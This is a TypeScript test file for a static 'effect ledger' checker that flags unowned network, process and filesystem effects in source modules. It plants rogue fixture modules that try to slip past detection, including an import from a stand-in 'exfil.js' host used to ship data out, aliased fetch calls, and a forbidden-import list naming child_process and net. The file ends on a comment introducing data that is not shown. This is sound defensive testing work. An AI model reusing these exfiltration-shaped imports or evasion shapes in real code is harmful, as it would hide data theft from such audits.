import { describe, it, expect, afterAll } from 'vitest';
import { mkdtemp, mkdir, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';
import {
  auditEffectOwnership,
  runEffectLedgerCensus,
  detectModuleEffects,
  extractImports,
  extractImportSpecifiers,
  maskNonCode,
  packageNameOf,
  classifySpecifier,
  scanEffectOccurrences,
  scanEffectTree,
  ruleClaims,
  isScannableFile,
  EFFECT_OWNERSHIP,
  EXCLUDED_DIRS,
  INERT_DEPENDENCIES,
  type EffectLedgerDiagnostic,
  type EffectOccurrence,
  type EffectOwnershipRule,
  type EffectScan,
  type ModuleLexer,
} from './effect-ledger.js';
import { lexModule } from '../../tools/test-helpers/module-lexer.js';
import {
  supersededExtractImports,
  supersededMaskNonCode,
} from '../../tools/test-helpers/superseded-source-lexer.js';

const SRC_ROOT = join(dirname(fileURLToPath(import.meta.url)), '..');

/**
 * Wrap a bare occurrence list in a scan whose denominators are HEALTHY, so a
 * verdict test exercises the ownership teeth and nothing else. The
 * denominator teeth get their own tests, where the counts are the subject.
 */
const scanOf = (occurrences: readonly EffectOccurrence[]): EffectScan => ({
  occurrences,
  moduleCount: 1,
  specifierCount: 1,
});

describe('detectModuleEffects', () => {
  it('classifies fs / process / network imports', () => {
    const occ = detectModuleEffects(
      'x/y.ts',
      `import { readFile } from 'node:fs/promises';
       import { execFile } from 'node:child_process';
       import net from 'node:net';`, lexModule,
    );
    const classes = occ.map((o) => o.effectClass).sort();
    expect(classes).toEqual(['filesystem', 'network', 'process']);
  });

  it('detects a global fetch as a network effect', () => {
    const occ = detectModuleEffects('x/y.ts', `export async function f() { return fetch('http://x'); }`, lexModule);
    expect(occ.map((o) => o.effectClass)).toContain('network');
  });

  it('does NOT classify a specifier that only appears in a comment or string', () => {
    const occ = detectModuleEffects(
      'x/y.ts',
      `// import { x } from 'node:fs';\nconst s = "from 'node:child_process'"; export const y = 1;`, lexModule,
    );
    expect(occ).toHaveLength(0);
  });

  it('dedupes multiple fs imports into one filesystem occurrence', () => {
    const occ = detectModuleEffects(
      'x/y.ts',
      `import { readFile } from 'node:fs/promises';\nimport { existsSync } from 'node:fs';`, lexModule,
    );
    expect(occ.filter((o) => o.effectClass === 'filesystem')).toHaveLength(1);
  });
});

describe('runEffectLedgerCensus — verdict logic', () => {
  const rules: EffectOwnershipRule[] = [
    { effectClass: 'process', match: 'vcs/', owner: 'vcs', idempotency: 'i', compensation: 'c' },
  ];

  it('flags an occurrence no rule claims as INDETERMINATE_OWNER', () => {
    const occ: EffectOccurrence[] = [
      { module: 'vcs/shell.ts', effectClass: 'process', evidence: 'node:child_process' },
      { module: 'mystery/rogue.ts', effectClass: 'process', evidence: 'node:child_process' },
    ];
    const result = runEffectLedgerCensus(scanOf(occ), rules);
    expect(result.ok).toBe(false);
    const codes = result.diagnostics.map((d) => d.code);
    expect(codes).toContain('INDETERMINATE_OWNER');
    const indeterminate = result.diagnostics.find((d) => d.code === 'INDETERMINATE_OWNER');
    expect(indeterminate && 'module' in indeterminate && indeterminate.module).toBe('mystery/rogue.ts');
  });

  it('flags a rule that claims nothing as STALE_OWNERSHIP', () => {
    const result = runEffectLedgerCensus(scanOf([]), rules);
    expect(result.diagnostics.map((d) => d.code)).toContain('STALE_OWNERSHIP');
  });

  it('passes when every occurrence is claimed and every rule claims something', () => {
    const occ: EffectOccurrence[] = [
      { module: 'vcs/shell.ts', effectClass: 'process', evidence: 'node:child_process' },
    ];
    expect(runEffectLedgerCensus(scanOf(occ), rules).ok).toBe(true);
  });
});

describe('ruleClaims', () => {
  it('prefix rule matches by directory; exact rule matches the module only', () => {
    const prefix: EffectOwnershipRule = { effectClass: 'filesystem', match: 'storage/', owner: 'o', idempotency: 'i', compensation: 'c' };
    const exact: EffectOwnershipRule = { effectClass: 'network', match: 'workflow/feedback.ts', owner: 'o', idempotency: 'i', compensation: 'c' };
    expect(ruleClaims(prefix, { module: 'storage/db.ts', effectClass: 'filesystem', evidence: 'fs' })).toBe(true);
    expect(ruleClaims(prefix, { module: 'storaged/db.ts', effectClass: 'filesystem', evidence: 'fs' })).toBe(false);
    expect(ruleClaims(exact, { module: 'workflow/feedback.ts', effectClass: 'network', evidence: 'fetch' })).toBe(true);
    expect(ruleClaims(exact, { module: 'workflow/other.ts', effectClass: 'network', evidence: 'fetch' })).toBe(false);
  });
});

describe('EXIT PROOF — live effect ledger', () => {
  it('(a) the live shipped source has ZERO indeterminate owners and no stale cover', async () => {
    const result = await auditEffectOwnership(SRC_ROOT, lexModule);
    // Surfacing the diagnostics array makes any regression self-describing.
    expect(result.diagnostics).toEqual([]);
    expect(result.ok).toBe(true);
    expect(result.occurrenceCount).toBeGreaterThan(0);
  });

  it('(b) a planted unowned effect FAILS the census against the live rules', async () => {
    const scan = await scanEffectTree(SRC_ROOT, lexModule);
    const planted: EffectOccurrence = {
      module: 'channel/rogue-emitter.ts',
      effectClass: 'filesystem',
      evidence: 'node:fs',
    };
    const result = runEffectLedgerCensus(
      { ...scan, occurrences: [...scan.occurrences, planted] },
      EFFECT_OWNERSHIP,
    );
    expect(result.ok).toBe(false);
    expect(
      result.diagnostics.some(
        (d) => d.code === 'INDETERMINATE_OWNER' && 'module' in d && d.module === 'channel/rogue-emitter.ts',
      ),
    ).toBe(true);
  });
});

describe('isScannableFile', () => {
  it('accepts shipped .ts and rejects test/decl/bench files', () => {
    expect(isScannableFile('emitter.ts')).toBe(true);
    expect(isScannableFile('emitter.test.ts')).toBe(false);
    expect(isScannableFile('types.d.ts')).toBe(false);
    expect(isScannableFile('x.bench.ts')).toBe(false);
  });
});

// ─── DR-13 — effect detection is not evadable by import shape ───────────────
//
// These are deliberately INTEGRATION-layer: each plants real `.ts` files into a
// real temp directory tree and runs the async `auditEffectOwnership(root, rules)`
// end-to-end (walk → read → mask/lex → detect → census). Feeding a hand-built
// occurrence array to `runEffectLedgerCensus` would only prove the CENSUS
// rejects an unowned occurrence — which it already did before DR-13. The defect
// DR-13 names is in the DETECTOR: `import axios from 'axios'` and
// `import { connect } from 'node:http2'` produced NO occurrence at all, so the
// census stayed green over a tree that plainly performed network I/O. Only a
// filesystem round-trip can kill that.

/**
 * The owner-shaped module planted in every fixture so no STALE_OWNERSHIP noise.
 *
 * It carries one real, INERT import purely so every planted tree has a non-zero
 * specifier denominator. Without it the smallest fixtures (this module alone,
 * and the aliased-global tree) would import nothing at all, and
 * `EMPTY_SPECIFIER_DENOMINATOR` would fire on them — correctly, since a tree in
 * which the lexer resolves nothing is a tree the import-shape rules never ranged
 * over. `zod` is on the vetted-inert allowlist, so it adds a specifier and no
 * occurrence.
 */
const OWNER_MODULE = 'owner/network-client.ts';
const OWNER_SOURCE = `
import { z } from 'zod';
export const Url = z.string();
export async function post(url: string, body: string): Promise<boolean> {
  const response = await fetch(url, { method: 'POST', body });
  return response.ok;
}
`;
const SCOPED_RULES: readonly EffectOwnershipRule[] = Object.freeze([
  {
    effectClass: 'network',
    match: OWNER_MODULE,
    owner: 'test-network-owner',
    idempotency: 'i',
    compensation: 'c',
  } as const,
]);

/** Materialise `{ relativePath: source }` into a fresh temp source root. */
async function plantTree(files: Record<string, string>): Promise<string> {
  const root = await mkdtemp(join(tmpdir(), 'effect-ledger-dr13-'));
  for (const [rel, source] of Object.entries(files)) {
    const abs = join(root, rel);
    await mkdir(dirname(abs), { recursive: true });
    await writeFile(abs, source, 'utf8');
  }
  return root;
}

function indeterminateOf(
  diagnostics: readonly EffectLedgerDiagnostic[],
): Extract<EffectLedgerDiagnostic, { code: 'INDETERMINATE_OWNER' }>[] {
  return diagnostics.filter(
    (d): d is Extract<EffectLedgerDiagnostic, { code: 'INDETERMINATE_OWNER' }> =>
      d.code === 'INDETERMINATE_OWNER',
  );
}

describe('DR-13 kill — the widened detector sees evaded network clients', () => {
  const roots: string[] = [];
  const plant = async (files: Record<string, string>): Promise<string> => {
    const root = await plantTree(files);
    roots.push(root);
    return root;
  };

  afterAll(async () => {
    await Promise.all(roots.map((r) => rm(r, { recursive: true, force: true })));
  });

  it('CONTROL — an owner-only tree is GREEN (so redness below is caused by the plant)', async () => {
    const root = await plant({ [OWNER_MODULE]: OWNER_SOURCE });
    const result = await auditEffectOwnership(root, lexModule, SCOPED_RULES);
    expect(result.diagnostics).toEqual([]);
    expect(result.ok).toBe(true);
  });

  it('EffectLedger_SeededNonListedHttpClient_CensusFailsClosed', async () => {
    // The DR-13 acceptance test. Every plant below was INVISIBLE to the
    // pre-widening detector (exact specifier list: node:http|https|net|tls|dgram
    // + undici + `fetch(`), so the census was green over all of it.
    const root = await plant({
      [OWNER_MODULE]: OWNER_SOURCE,
      // A well-known client the old list did not name.
      'rogue/axios-client.ts': `
        import axios from 'axios';
        export const get = async (url: string): Promise<unknown> => (await axios.get(url)).data;
      `,
      // Another one, imported for side effect only.
      'rogue/got-client.ts': `
        import got from 'got';
        export const head = async (url: string): Promise<number> => (await got.head(url)).statusCode;
      `,
      // A node builtin the old list missed outright.
      'rogue/http2-client.ts': `
        import { connect } from 'node:http2';
        export const open = (authority: string) => connect(authority);
      `,
      // The case a curated list can NEVER cover: a client published under a name
      // nobody has heard of. This is what closed-world rule 3 exists for.
      'rogue/private-transport.ts': `
        import { post } from '@acme/secret-transport';
        export const send = (url: string, body: string) => post(url, body);
      `,
      // A remote-URL import: fetching over the wire IS the import.
      'rogue/url-import.ts': `
        import { ship } from 'https://cdn.example.test/exfil.js';
        export const send = (body: string) => ship(body);
      `,
    });

    const result = await auditEffectOwnership(root, lexModule, SCOPED_RULES);

    expect(result.ok).toBe(false);
    const bad = indeterminateOf(result.diagnostics);
    expect(bad.map((d) => d.module).sort()).toEqual([
      'rogue/axios-client.ts',
      'rogue/got-client.ts',
      'rogue/http2-client.ts',
      'rogue/private-transport.ts',
      'rogue/url-import.ts',
    ]);
    for (const diagnostic of bad) {
      expect(diagnostic.effectClass).toBe('network');
      expect(diagnostic.message).toContain(diagnostic.module);
    }
    // The plant is the ONLY reason the tree is red.
    expect(result.diagnostics.every((d) => d.code === 'INDETERMINATE_OWNER')).toBe(true);

    // Evidence must NAME what was admitted — a curated client by its own name, an
    // unknown package as an explicitly conservative judgement. This is what keeps
    // rules 2 and 3 independently load-bearing rather than one subsuming the other.
    const evidence = new Map(bad.map((d) => [d.module, d.evidence]));
    expect(evidence.get('rogue/axios-client.ts')).toBe('axios');
    expect(evidence.get('rogue/got-client.ts')).toBe('got');
    expect(evidence.get('rogue/http2-client.ts')).toBe('node:http2');
    expect(evidence.get('rogue/private-transport.ts')).toBe(
      'unvetted-dependency:@acme/secret-transport',
    );
    expect(evidence.get('rogue/url-import.ts')).toBe('https://cdn.example.test/exfil.js');
  });

  it('EffectLedger_AliasedFetchGlobal_CensusFailsClosed', async () => {
    // DR-13's "aliased globals" class. None of these contains a literal
    // `fetch(` call, so the pre-widening `\bfetch\s*\(` regex saw nothing.
    const root = await plant({
      [OWNER_MODULE]: OWNER_SOURCE,
      'rogue/alias.ts': `
        const send = fetch;
        export const go = (url: string): Promise<Response> => send(url);
      `,
      'rogue/bound-alias.ts': `
        const send = fetch.bind(globalThis);
        export const go = (url: string): Promise<Response> => send(url);
      `,
      'rogue/global-member.ts': `
        export const go = (url: string): Promise<Response> => globalThis.fetch(url);
      `,
      'rogue/destructured.ts': `
        const { fetch: send } = globalThis;
        export const go = (url: string): Promise<Response> => send(url);
      `,
      'rogue/socket.ts': `
        export const open = (url: string): WebSocket => new WebSocket(url);
      `,
    });

    const result = await auditEffectOwnership(root, lexModule, SCOPED_RULES);

    expect(result.ok).toBe(false);
    const bad = indeterminateOf(result.diagnostics);
    expect(bad.map((d) => d.module).sort()).toEqual([
      'rogue/alias.ts',
      'rogue/bound-alias.ts',
      'rogue/destructured.ts',
      'rogue/global-member.ts',
      'rogue/socket.ts',
    ]);
    // Each ambient shape must be attributed to ITS OWN rule, so reverting any one
    // rule kills a named expectation rather than being covered by a sibling.
    const evidence = new Map(bad.map((d) => [d.module, d.evidence]));
    expect(evidence.get('rogue/alias.ts')).toBe('fetch (aliased binding)');
    expect(evidence.get('rogue/bound-alias.ts')).toBe('fetch (aliased binding)');
    expect(evidence.get('rogue/global-member.ts')).toBe('globalThis.fetch');
    expect(evidence.get('rogue/destructured.ts')).toBe('fetch (destructured from globalThis)');
    expect(evidence.get('rogue/socket.ts')).toBe('new WebSocket');
  });

  it('EffectLedger_ReExportOfEffectPrimitive_IsDetectedAtTheReExporter', async () => {
    // DR-13's "re-export/alias of an effect primitive". A re-export NAMES the
    // primitive, so the re-exporting module IS the effect site. The consumer of
    // the re-export is NOT charged — attribution is per module, never transitive
    // (the documented trust boundary, pinned by the second half of this test).
    const root = await plant({
      [OWNER_MODULE]: OWNER_SOURCE,
      'rogue/primitives.ts': `export { request } from 'node:https';`,
      'quiet/consumer.ts': `
        import { request } from '../rogue/primitives.js';
        export const go = (url: string): unknown => request(url);
      `,
    });

    const result = await auditEffectOwnership(root, lexModule, SCOPED_RULES);

    const bad = indeterminateOf(result.diagnostics);
    expect(bad.map((d) => d.module)).toEqual(['rogue/primitives.ts']);
    expect(bad[0]?.evidence).toBe('node:https');
    // Pin the boundary: the consumer is deliberately NOT an effect site.
    expect(bad.some((d) => d.module === 'quiet/consumer.ts')).toBe(false);
  });

  it('EffectLedger_IncidentalTokensFromLiveTreeShapes_YieldNoOccurrence', async () => {
    // Every snippet is copied in SHAPE from a real shipped module that mentions a
    // client/primitive token but performs no network effect. If any matched, the
    // widening would be unusable.
    const incidental: Record<string, string> = {
      // config/toolchains.ts — the hermetic third-party-http SIGNATURE. A regex
      // literal naming every client this ledger detects.
      'config/toolchains.ts': `
        const signature = {
          depClass: 'third-party-http',
          test: /^(axios|node-fetch|got|undici|superagent|ky|request|phin)(\\/|$)/i,
        };
        export const classify = (s: string): boolean => signature.test.test(s);
      `,
      // workflow/admission/remediation-purity.ts — forbidden-marker string array.
      'workflow/admission/remediation-purity.ts': `
        export const FORBIDDEN_IMPORT_MARKERS: readonly string[] = Object.freeze([
          'node:fs', 'node:child_process', 'node:net', 'node:http', 'node:https',
          'node:dgram', 'node:tls', 'undici',
        ]);
      `,
      // review/check-catalog.ts — a lint pattern ABOUT fetch, in a string and a
      // raw template literal.
      'review/check-catalog.ts': `
        export const check = {
          description: 'fetch() calls without timeout can hang indefinitely',
          pattern: String.raw\`fetch\\(\`,
          falsePositives: 'Test stubs or mock fetch calls that make no real request.',
        };
      `,
      // architecture/adapter-ownership-seam.ts — prose naming the whole surface.
      'architecture/adapter-ownership-seam.ts': `
        export const note =
          'All network I/O (http/https/net/tls/dgram/undici/fetch) is owned by the feedback client.';
      `,
      // verbs/vcs/validate-pr-body.ts — an identifier that merely STARTS with
      // fetch; and workspace/discovery.ts — one that merely contains "Fetch".
      'verbs/vcs/validate-pr-body.ts': `
        function fetchPrData(pr: number): number { return pr; }
        async function getOrFetchRoots(): Promise<number> { return 1; }
        export const data = fetchPrData(1) + (await getOrFetchRoots());
      `,
      // contract/oracle/fixtures.ts — an effect RECORD naming a fetch URL.
      'contract/oracle/fixtures.ts': `
        export const record = (ctx: { effects: { record: (a: string, b: string) => void } }): void =>
          ctx.effects.record('network', 'fetch:https://exfil.example/telemetry');
      `,
      // verbs/gates/mock-boundary.ts — doc comment naming a bare specifier.
      'verbs/gates/mock-boundary.ts': `
        // BARE package specifiers ('axios', '@scope/pkg') are returned verbatim.
        /* e.g. import axios from 'axios'; or import { connect } from 'node:http2'; */
        export const verbatim = true;
      `,
      // Every vetted-inert dependency the shipped tree actually imports.
      'inert/dependencies.ts': `
        import { z } from 'zod';
        import matter from 'gray-matter';
        import { Command } from 'commander';
        import { Database } from 'bun:sqlite';
        import util from 'util';
        import { parse } from 'yaml';
        export const all = [z, matter, Command, Database, util, parse];
      `,
      // Type-only imports of network primitives — fully erased, no runtime binding.
      'types/only.ts': `
        import type { Server } from 'node:http';
        export type { Socket } from 'node:net';
        export type Handle = Server | null;
      `,
    };

    // Unit-level: no snippet yields an occurrence.
    for (const [module, source] of Object.entries(incidental)) {
      expect(detectModuleEffects(module, source, lexModule), `${module} must yield no occurrence`).toEqual([]);
    }

    // Integration-level: a whole tree of them, with a real owner, stays GREEN.
    const root = await plant({ ...incidental, [OWNER_MODULE]: OWNER_SOURCE });
    const result = await auditEffectOwnership(root, lexModule, SCOPED_RULES);
    expect(result.diagnostics).toEqual([]);
    expect(result.ok).toBe(true);
  });

  it('EffectLedger_TypeOnlyNetworkImport_YieldsNoOccurrence', async () => {
    // Focused pin for the type-only guard on its own, so it cannot be masked by
    // a sibling expectation in the false-positive sweep above.
    expect(detectModuleEffects('x/y.ts', `import type { Server } from 'node:http2';`, lexModule)).toEqual([]);
    expect(detectModuleEffects('x/y.ts', `export type { Socket } from 'node:net';`, lexModule)).toEqual([]);
    expect(detectModuleEffects('x/y.ts', `import type Axios from 'axios';`, lexModule)).toEqual([]);
    // …but the VALUE form of the very same specifier is still an effect site.
    expect(detectModuleEffects('x/y.ts', `import { connect } from 'node:http2';`, lexModule)).toEqual([
      { module: 'x/y.ts', effectClass: 'network', evidence: 'node:http2' },
    ]);
    // A `type` modifier must not leak across statements.
    const mixed = `export type Foo = number;\nimport got from 'got';`;
    expect(detectModuleEffects('x/y.ts', mixed, lexModule).map((o) => o.evidence)).toEqual(['got']);

    const root = await plant({
      [OWNER_MODULE]: OWNER_SOURCE,
      'types/net.ts': `
        import type { Http2Session } from 'node:http2';
        export type Session = Http2Session | null;
      `,
    });
    const result = await auditEffectOwnership(root, lexModule, SCOPED_RULES);
    expect(result.diagnostics).toEqual([]);
    expect(result.ok).toBe(true);
  });

  it('EffectLedger_RegexLiteralWithQuoteChars_DoesNotDesyncTheLexer', () => {
    // Regression guard for the lexer defect the DR-12 widening exposed in the
    // near-duplicate `vcs-ownership.stripComments`, and which this module's own
    // copies carried: the `'` inside a regex character class is NOT a string
    // delimiter. Without regex awareness the walk enters a phantom string there
    // and stops recognising `//`, so comment prose leaks in and self-matches.
    //
    // The comment is on the SAME LINE as the regex on purpose. A newline would
    // resynchronise by itself (`'`/`"` are line-bounded), so a next-line fixture
    // passes even WITHOUT regex awareness and would leave this guard vacuous.
    const sameLine = [
      "const RE = /(['\"])x\\1/; // don't ship: import axios from 'axios';",
      'export const after = 1;',
    ].join('\n');
    // The apostrophe in "don't" is what makes this a real kill: without regex
    // awareness the `'` inside the character class opens a phantom string, that
    // apostrophe CLOSES it, and the rest of the comment is scanned as CODE — so
    // the documented `from 'axios'` is recorded as a live import.
    expect(extractImports(sameLine, lexModule)).toEqual([]);
    expect(detectModuleEffects('architecture/detector.ts', sameLine, lexModule)).toEqual([]);

    // What used to be recorded here as "the conservative heuristic's known blind
    // spot": `return /…/` scores the `/` as division (previous significant char
    // is `n`), so regex mode was NOT entered and a phantom string opened inside
    // the regex. The old note argued the damage was capped because `'`/`"` are
    // line-bounded. It is capped — for `'` and `"`. Task 065's kill fixture
    // below shows what happens when the quote character inside the regex is a
    // BACKTICK, which is not line-bounded. Under the port there is no blind spot
    // to cap: a regex literal is a regex literal.
    const blindSpot = [
      `export function isQuote(x: string): boolean { return /(['"])/.test(x); }`,
      `// historical: import axios from 'axios';`,
      `import { connect } from 'node:http2';`,
    ].join('\n');
    expect(extractImports(blindSpot, lexModule).map((r) => r.specifier)).toEqual(['node:http2']);
    expect(detectModuleEffects('x/y.ts', blindSpot, lexModule).map((o) => o.evidence)).toEqual(['node:http2']);

    // Same for a same-line BLOCK comment.
    const blockSameLine =
      "const RE = /(['\"`])x\\1/; /* was: import axios from 'axios' */ export const a = 1;";
    expect(detectModuleEffects('architecture/detector.ts', blockSameLine, lexModule)).toEqual([]);

    // A regex BODY must be masked, or this very module self-matches: it holds
    // `/(?<![\\w$.])fetch\\s*\\(/` as a detection rule and would report itself as
    // a network effect under `architecture/`, which owns no network rule.
    const selfShape = [
      'const AMBIENT = [',
      '  { re: /(?<![\\w$.])fetch\\s*\\(/, evidence: "fetch" },',
      '  { re: /=\\s*fetch(?![\\w$])/, evidence: "alias" },',
      '];',
      'export const rules = AMBIENT;',
    ].join('\n');
    expect(maskNonCode(selfShape, lexModule)).not.toContain('fetch');
    expect(detectModuleEffects('architecture/effect-ledger.ts', selfShape, lexModule)).toEqual([]);

    // A `/` in DIVISION position must NOT be mistaken for a regex opener — that
    // would swallow real code and cause a false NEGATIVE (the dangerous
    // direction for a ratchet).
    const division = `const ratio = total / count;\nimport { connect } from 'node:http2';`;
    expect(detectModuleEffects('x/y.ts', division, lexModule).map((o) => o.evidence)).toEqual(['node:http2']);
  });

  it('EffectLedger_DocumentedTrustBoundary_InjectedClientAndComputedAccess', () => {
    // These pin the DR-13 carve-outs documented in the module JSDoc so the
    // carve-out cannot silently GROW. Each is a deliberate false negative.

    // 1. INJECTED CLIENT — the client's effect surface belongs to the caller,
    //    which a per-module scan never sees. Undecidable here by construction.
    const injected = `
      export interface HttpLike { readonly post: (url: string, body: string) => Promise<boolean>; }
      export class Reporter {
        constructor(private readonly http: HttpLike) {}
        async report(url: string, body: string): Promise<boolean> {
          return this.http.post(url, body);
        }
      }
    `;
    expect(detectModuleEffects('x/reporter.ts', injected, lexModule)).toEqual([]);

    // 2. COMPUTED / STRING-INDEXED GLOBAL ACCESS — undecidable in general.
    const computed = `
      const g = globalThis as unknown as Record<string, (u: string) => Promise<unknown>>;
      const key = 'fet' + 'ch';
      export const go = (url: string): Promise<unknown> => (g[key] as (u: string) => Promise<unknown>)(url);
    `;
    expect(detectModuleEffects('x/computed.ts', computed, lexModule)).toEqual([]);

    // 3. OBJECT SHORTHAND — excluded on purpose: a bare `fetch` identifier rule
    //    false-positives on ordinary property keys and interface members, which
    //    would make the ratchet unusable. Both shapes below must stay inert.
    expect(detectModuleEffects('x/keys.ts', `export const c = { fetch: 1, post: 2 };`, lexModule)).toEqual([]);
    expect(
      detectModuleEffects('x/iface.ts', `export interface Deps { fetch: (u: string) => void }`, lexModule),
    ).toEqual([]);
  });

  it('EffectLedger_AmbientGlobalAliases_GlobalSelfWindow_AreNetworkEffects', () => {
    // DR-13 rule-2 widening: `globalThis` is not the only spelling of the
    // global object. `global` (Node), `self` (workers), and `window` reach the
    // IDENTICAL ambient network surface, so a literal-`globalThis` rule was an
    // open evasion (`global.fetch(url)` scanned clean).
    for (const root of ['globalThis', 'global', 'self', 'window']) {
      const occ = detectModuleEffects(
        'x/alias.ts',
        `export const go = (u: string) => ${root}.fetch(u);`, lexModule,
      );
      expect(occ.map((o) => o.effectClass), `${root}.fetch must be a network effect`).toEqual([
        'network',
      ]);
    }
    // Anchored on the LEFT: a member access or longer identifier ending in one
    // of the alias names must NOT match (`app.window.fetch` is `.window`-rooted
    // member access on an app object; `notglobal.fetch` is a plain object).
    expect(detectModuleEffects('x/n1.ts', `export const x = notglobal.fetch('u');`, lexModule)).toEqual([]);
  });

  it('EffectLedger_BunAmbientAPIs_AreDetected_PerEffectClass', () => {
    // Bun's ambient runtime object performs I/O with NO import at all —
    // `Bun.serve`/`Bun.connect` open sockets, `Bun.spawn` forks a process,
    // `Bun.write`/`Bun.file` touch the filesystem. Pre-widening none of these
    // were detected (and the trust boundary never documented the gap).
    const cases: readonly [source: string, effectClass: string, evidence: string][] = [
      [`export const s = Bun.serve({ port: 3000, fetch: () => new Response('x') });`, 'network', 'Bun.serve'],
      [`export const c = await Bun.connect({ hostname: 'x', port: 1 });`, 'network', 'Bun.serve'],
      [`export const p = Bun.spawn(['ls']);`, 'process', 'Bun.spawn'],
      [`export const ok = await Bun.write('/tmp/x', 'data');`, 'filesystem', 'Bun.write'],
      [`export const f = Bun.file('/tmp/x');`, 'filesystem', 'Bun.write'],
    ];
    for (const [source, effectClass, evidence] of cases) {
      const occ = detectModuleEffects('x/bun.ts', source, lexModule);
      expect(occ, `${source} must be detected`).toEqual([
        { module: 'x/bun.ts', effectClass, evidence },
      ]);
    }
    // Shape-anchored: an object that merely LOOKS like Bun stays inert, and the
    // names inside strings/comments never count (maskNonCode).
    expect(detectModuleEffects('x/nb1.ts', `export const x = myBun.serve(1);`, lexModule)).toEqual([]);
    expect(detectModuleEffects('x/nb2.ts', `// docs: Bun.serve is the ambient server`, lexModule)).toEqual([]);
    expect(detectModuleEffects('x/nb3.ts', `export const s = 'Bun.spawn(cmd)';`, lexModule)).toEqual([]);
  });

  it('EffectLedger_ClosedWorldAllowlist_IsPerPackageNotPerSubpath', () => {
    // `@modelcontextprotocol/server/stdio` must be covered by the ONE
    // `@modelcontextprotocol/server` allowlist entry, or every SDK subpath would
    // be an unvetted dependency and the live tree would go red.
    //
    // Retargeted from the v1 package by task 049. The scoped-package subpath
    // rule is what is under test, so the specifier must name a package that is
    // actually ALLOWLISTED — pointing it at the removed v1 SDK would have
    // turned this into an assertion that unvetted packages are vetted, and it
    // would have failed for the right reason while reading as the wrong one.
    expect(packageNameOf('@modelcontextprotocol/server/stdio')).toBe(
      '@modelcontextprotocol/server',
    );
    expect(packageNameOf('gray-matter')).toBe('gray-matter');
    expect(packageNameOf('yaml/dist/x.js')).toBe('yaml');

    expect(classifySpecifier('@modelcontextprotocol/server/stdio')).toBeUndefined();
    // …and the RETIRED generation is no longer vetted: a v1 subpath is now an
    // unvetted dependency, which is the allowlist correctly declining to vouch
    // for a package this tree does not install.
    expect(classifySpecifier('@modelcontextprotocol/sdk/types.js')).toEqual({
      effectClass: 'network',
      evidence: 'unvetted-dependency:@modelcontextprotocol/sdk',
    });
    expect(classifySpecifier('@acme/anything/deep/path.js')).toEqual({
      effectClass: 'network',
      evidence: 'unvetted-dependency:@acme/anything',
    });
    // A bare (unprefixed) node builtin is a BUILTIN, never an unvetted package.
    expect(classifySpecifier('util')).toBeUndefined();
    expect(classifySpecifier('child_process')).toEqual({
      effectClass: 'process',
      evidence: 'child_process',
    });
    // A non-network builtin scheme stays inert.
    expect(classifySpecifier('bun:sqlite')).toBeUndefined();
    // Every allowlist entry must actually BE inert (no self-contradiction).
    for (const pkg of INERT_DEPENDENCIES) {
      expect(classifySpecifier(pkg), `${pkg} is allowlisted so must classify inert`).toBeUndefined();
    }
  });
});

describe('DR-13 live tree — the widened census is green and load-bearing', () => {
  it('EffectLedger_LiveShippedSource_IsGreenUnderTheWidenedDetector', async () => {
    // The widening must not manufacture work: the live tree carries no
    // unvetted dependency, no third-party client and no aliased global, so the
    // occurrence set is unchanged and every occurrence still has an owner.
    const result = await auditEffectOwnership(SRC_ROOT, lexModule);
    expect(result.diagnostics).toEqual([]);
    expect(result.ok).toBe(true);
  });

  it('EffectLedger_LiveDeclaredOwnerWithNoLiveSite_TripsStaleOwnership', async () => {
    // The phantom-cover half of the two-way ratchet, over the REAL tree: adding
    // a rule that claims nothing must fail closed, and must be the ONLY reason
    // the tree is red (which re-proves the green case above).
    const phantom: EffectOwnershipRule = {
      effectClass: 'network',
      match: 'nowhere/phantom-client.ts',
      owner: 'phantom-owner',
      idempotency: 'i',
      compensation: 'c',
    };
    const result = await auditEffectOwnership(SRC_ROOT, lexModule, [...EFFECT_OWNERSHIP, phantom]);
    expect(result.ok).toBe(false);
    expect(result.diagnostics).toEqual([
      expect.objectContaining({
        code: 'STALE_OWNERSHIP',
        match: 'nowhere/phantom-client.ts',
        owner: 'phantom-owner',
      }),
    ]);
  });

  it('EffectLedger_LiveBareImportSurface_IsFullyCoveredByTheInertAllowlist', async () => {
    // Makes the closed-world rule honest rather than lucky: every bare package
    // the shipped tree imports must be a VETTED entry, not merely absent from a
    // client denylist. A new dependency lands here first, loudly.
    //
    // The walk mirrors the scanner's scope EXACTLY (same EXCLUDED_DIRS, same
    // isScannableFile) — an over-wide walk would report `evals/` harness imports
    // the census never sees.
    const { readdir, readFile } = await import('node:fs/promises');
    const files: string[] = [];
    const walk = async (dir: string): Promise<void> => {
      for (const entry of await readdir(dir, { withFileTypes: true })) {
        if (entry.isDirectory()) {
          if (EXCLUDED_DIRS.has(entry.name)) continue;
          await walk(join(dir, entry.name));
        } else if (entry.isFile() && isScannableFile(entry.name)) {
          files.push(join(dir, entry.name));
        }
      }
    };
    await walk(SRC_ROOT);
    expect(files.length).toBeGreaterThan(100);

    const unvetted = new Set<string>();
    for (const file of files) {
      for (const ref of extractImports(await readFile(file, 'utf8'), lexModule)) {
        const hit = classifySpecifier(ref.specifier);
        if (hit !== undefined && hit.evidence.startsWith('unvetted-dependency:')) {
          unvetted.add(`${hit.evidence} (${file})`);
        }
      }
    }
    expect([...unvetted]).toEqual([]);
  });
});

// ─── DR-26 / task 065 — the lexical question is a PORT, and the gap is measured
//
// `extractImports` and `maskNonCode` used to be two hand-rolled walks in shipped
// `src/`, and the module header admitted the regex-versus-division rule was a
// heuristic. Task 065 inverted both to one required {@link ModuleLexer} port,
// implemented by `test-helpers/module-lexer.ts` over the real TypeScript parser.
//
// The port cannot be justified by asserting that it is right; a port that is
// never shown to DIFFER from what it replaced has not been shown to be needed.
// So the retired walks are kept verbatim in `test-helpers/superseded-source-lexer.ts`
// and assembled here into a `ModuleLexer` — the only place that ever happens —
// so both instruments can be run over the same input and BOTH answers asserted.

/**
 * The census as it behaved BEFORE task 065: the same policy, driven by the
 * retired lexer.
 *
 * Deliberately assembled here rather than exported from the helper. Its only
 * use is measuring the gap; nothing may drive a real census through it.
 */
const SUPERSEDED_LEXER: ModuleLexer = (source: string) => ({
  imports: supersededExtractImports(source),
  maskedSource: supersededMaskNonCode(source),
});

/**
 * The adversarial set DR-26 names for this defect class, as DATA.
 *
 * `parse` and `heuristic` are both asserted for every row, so a reader sees the
 * gap rather than taking it on faith, and so a row that stops disagreeing
 * (someone "fixing" the retired walk) fails loudly instead of quietly making the
 * kill fixture vacuous.
 */
